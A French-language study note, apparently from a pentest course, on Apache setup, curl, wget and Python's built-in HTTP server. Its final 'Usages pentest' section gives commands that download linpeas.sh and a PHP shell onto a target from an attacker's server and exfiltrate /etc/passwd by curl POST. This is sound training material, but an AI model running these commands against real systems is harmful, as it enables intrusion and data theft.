---
tags:
  - linux
  - web
  - apache
  - curl
  - wget
  - python
  - pentest
  - file-transfer
---

# Working with Web Services

## Apache

```bash
# Installation et démarrage
sudo apt install apache2 -y
sudo systemctl start apache2

# Vérifier
curl -I http://localhost

# Changer le port (défaut : 80)
# /etc/apache2/ports.conf → Listen 8080
# /etc/apache2/sites-enabled/000-default.conf → VirtualHost *:8080
```

**Racine web :** `/var/www/html`

**Modules clés :**

| Module | Rôle |
|---|---|
| `mod_ssl` | Chiffrement HTTPS |
| `mod_proxy` | Proxy / reverse proxy |
| `mod_rewrite` | Réécriture d'URLs |
| `mod_headers` | Manipulation des headers HTTP |
| `mod_security` | WAF (Web Application Firewall) |

**Langages server-side supportés :** PHP, Perl, Ruby, Python, JavaScript, Lua, .NET

---

## curl

Transfert de données via HTTP, HTTPS, FTP, SFTP, SCP… — retourne le contenu en **STDOUT**.

```bash
# Récupérer le contenu d'une page
curl http://localhost

# Afficher uniquement les headers
curl -I http://localhost

# Suivre les redirections
curl -L http://site.com

# Envoyer une requête POST
curl -X POST -d "user=admin&pass=test" http://site.com/login

# Télécharger un fichier
curl -O http://site.com/fichier.txt

# Avec authentification
curl -u user:pass http://site.com

# Ignorer les erreurs SSL
curl -k https://site.com

# Spécifier un User-Agent
curl -A "Mozilla/5.0" http://site.com
```

---

## wget

Télécharge et **sauvegarde localement** le contenu — gestionnaire de téléchargement en ligne de commande.

```bash
# Télécharger une page (sauvegardée en index.html)
wget http://localhost

# Télécharger un fichier spécifique
wget http://site.com/fichier.zip

# Téléchargement récursif
wget -r http://site.com

# Télécharger en arrière-plan
wget -b http://site.com/gros_fichier.iso
```

| | `curl` | `wget` |
|---|---|---|
| Sortie | STDOUT | Fichier local |
| Protocoles | HTTP, HTTPS, FTP, SFTP, SCP… | HTTP, HTTPS, FTP |
| Usage principal | Interaction/test | Téléchargement |

---

## Python HTTP Server

One-liner pour servir un répertoire via HTTP — idéal pour transférer des fichiers rapidement.

```bash
# Servir le répertoire courant (port 8000)
python3 -m http.server

# Répertoire spécifique
python3 -m http.server --directory /chemin/vers/fichiers

# Port personnalisé
python3 -m http.server 443
```

Les requêtes sont loggées directement dans le terminal — utile pour vérifier ce qui est récupéré.

---

## Usages pentest

```bash
# Depuis la cible — récupérer un fichier depuis notre serveur
wget http://<notre_ip>:8000/linpeas.sh
curl http://<notre_ip>:8000/shell.php -o /tmp/shell.php

# Tester une page web et inspecter les headers
curl -I http://cible.com

# Exfiltration via curl POST
curl -X POST -d @/etc/passwd http://<notre_ip>/collect
```
